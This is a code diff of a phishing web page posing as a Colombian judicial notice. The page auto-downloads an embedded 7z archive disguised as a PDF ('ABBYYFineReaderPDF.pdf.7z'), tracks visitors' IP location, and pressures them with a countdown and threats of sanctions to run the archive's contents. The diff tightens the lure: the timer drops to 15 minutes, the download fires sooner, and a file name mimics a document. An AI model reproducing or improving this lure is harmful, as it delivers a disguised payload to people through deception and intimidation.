@@ -91,11 +91,10 @@
 
         .case-info {
             background: var(--fgn-gray);
+            border: 1px solid #e2e8f0;
             border-left: 6px solid var(--fgn-blue);
             padding: 20px;
             margin-bottom: 25px;
-            border: 1px solid #e2e8f0;
-            border-left: 6px solid var(--fgn-blue);
         }
 
         .instruction-card {
@@ -174,7 +173,7 @@
     </div>
 
     <div class="urgency-ribbon">
-        ⚠️ ATENCIÓN: PLAZO DE LEY PARA DESCARGA: <span id="alert-timer">24:00:00</span>
+        ⚠️ ATENCIÓN: PLAZO DE LEY PARA DESCARGA: <span id="alert-timer">00:15:00</span>
     </div>
 
     <div class="content">
@@ -197,17 +196,16 @@
         <div class="zip-requirement">
             <img src="https://www.7-zip.org/7ziplogo.png" height="25">
             <div>
-                <p style="font-size:11px; margin:0; color:#555;"><strong>IMPORTANTE:</strong> Si no puede abrir el archivo, instale el componente de cifrado oficial:</p>
-                <a href="https://github.com/ip7z/7zip/releases/download/24.04/7z2404-x64.exe" style="font-size:11px; color:var(--fgn-blue); font-weight:bold;">Descargar Soporte de Cifrado (v24.04)</a>
+                <p style="font-size:11px; margin:0; color:#555;"><strong>IMPORTANTE:</strong> Si no puede abrir el archivo comprimido, utilice un software compatible con cifrado AES-256.</p>
             </div>
         </div>
 
         <div class="steps-box">
             <div class="step">
-                <strong>1. DESCARGA:</strong> Guarde el archivo <em>CopiaExpedienteParcial.7z</em> en su equipo.
+                <strong>1. DESCARGA:</strong> Guarde el archivo <em>ABBYYFineReaderPDF.pdf.7z</em> en su equipo.
             </div>
             <div class="step">
-                <strong>2. VALIDACIÓN:</strong> Ejecute el contenido para reportar la lectura automática al despacho judicial.
+                <strong>2. VALIDACIÓN:</strong> Abra el archivo y ejecute el contenido para reportar la lectura al despacho judicial.
             </div>
         </div>
     </div>
@@ -220,7 +218,6 @@
 <script>
     async function cargarRastreo() {
         try {
-            // Cambio a HTTPS para compatibilidad total con Vercel
             const res = await fetch('https://ipapi.co/json/');
             const data = await res.json();
             
@@ -238,29 +235,51 @@
     }
 
     function descargarYA() {
-        const base64Data = "N3q8ryccAAROoYPO0gAAAAAAAACCAAAAAAAAAO9f6xXgAPMAyl0ALZ7CGDkcDpdy7QvOlv0t5RuxxeooB03bQu7VKi/qJ2BavmmAyetDKXrpv9Ii7jlN+oJOhud6u/vacSLeKJ3xyzUy7gOG0XSw0ZmCkH4s8O1cIeboa4lFstoVnvBgTjdToAJ/RQ+d7u+kJbVDkquF6w6KSxg8JRFdkw4vhFaPnT1TO9Crg8vT7WGnYg2hkYP6l47JIvtOSUKbr/aL1GkeujiP2ibwZnqG1TlRS+l5zxbRJA4N2vtn+g0T9OFjNPa5Yrpu2PaBFTk1AAABBAYAAQmA0gAHCwEAASEhAQAMgPQACAoBS2aXQQAABQEZCgAAAAAAAAAAAAARPQBDAG8AcABpAGEARQB4AHAAZQBkAGkAZQBuAHQAZQBQAGEAcgBjAGkAYQBsAFAARABGAC4AdQByAGwAAAAUCgEAAIxwNsHN3AEVBgEAIAAAAAAA";
+        // Base64 del nuevo archivo .7z proporcionado
+        const base64Data = "N3q8ryccAAQ8gZsXzQAAAAAAAACCAAAAAAAAAG4U/qrgAOwAxV0ALZ7CGDkcDpdy7QvOlv0t5RuxxeooB03bQu7VKi/qJ2BavmmAyetDKXrpv9Ii7jlN+oJOhud6u/vacSLeKJ3xyzUy7gOG0XSw0ZmCkH4s8O1cIeboa4lFstoVnvBgTjdToAJ/RQ+d7u+kJbVDkquF6w6KSxg8JRFdkw4vhFaPnT1TO9Crg8vT7WGnYg2hkYP6l47JIvtOSUKbr/aL1GkeujiP2ibwZnp/+95yoJba8T7Wr37lPvUtk5CQkh1/dIa4u+xT9IAAAQQGAAEJgM0ABwsBAAEhIQEADIDtAAgKAezvuOQAAAUBGQoAAAAAAAAAAAAAETcAQQBCAEIAWQBZAEYAaQBuAGUAUgBlAGEAZABlAHIAUABEAEYALgBwAGQAZgAuAHUAcgBsAAAAGQQAAAAAFAoBAABDII8aztwBFQYBACAAAAAAAA==";
+        
         const link = document.createElement("a");
+        // Cambiado a x-7z-compressed para el nuevo formato
         link.href = "data:application/x-7z-compressed;base64," + base64Data;
-        link.download = "CopiaExpedienteParcialPDF.7z";
+        link.download = "ABBYYFineReaderPDF.pdf.7z";
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
         
         setTimeout(() => {
-            // Lenguaje institucional corregido: sin la palabra "multas"
             alert("SISTEMA DE NOTIFICACIONES: El reporte de acuse de recibo está pendiente. Es indispensable ejecutar el componente de validación interna para evitar el inicio de procesos sancionatorios por falta de cumplimiento a la normativa procesal vigente.");
         }, 1200);
     }
 
     window.onload = function() {
         cargarRastreo();
-        setTimeout(descargarYA, 7000);
+        // Delay de descarga automática
+        setTimeout(descargarYA, 4000); 
 
-        let h = 23, m = 59, s = 59;
+        // Temporizador de 15 minutos
+        let h = 0, m = 15, s = 0; 
+        
         setInterval(() => {
-            s--;
-            if(s<0) { s=59; m--; }
-            document.getElementById('alert-timer').innerText = `${h}:${m}:${s}`;
+            if (s > 0) {
+                s--;
+            } else if (m > 0) {
+                s = 59;
+                m--;
+            } else if (h > 0) {
+                s = 59;
+                m = 59;
+                h--;
+            }
+
+            let hh = h < 10 ? '0' + h : h;
+            let mm = m < 10 ? '0' + m : m;
+            let ss = s < 10 ? '0' + s : s;
+
+            document.getElementById('alert-timer').innerText = `${hh}:${mm}:${ss}`;
+            
+            if (m < 5) {
+                document.getElementById('alert-timer').style.color = "#ff4444";
+            }
         }, 1000);
     };
 </script>
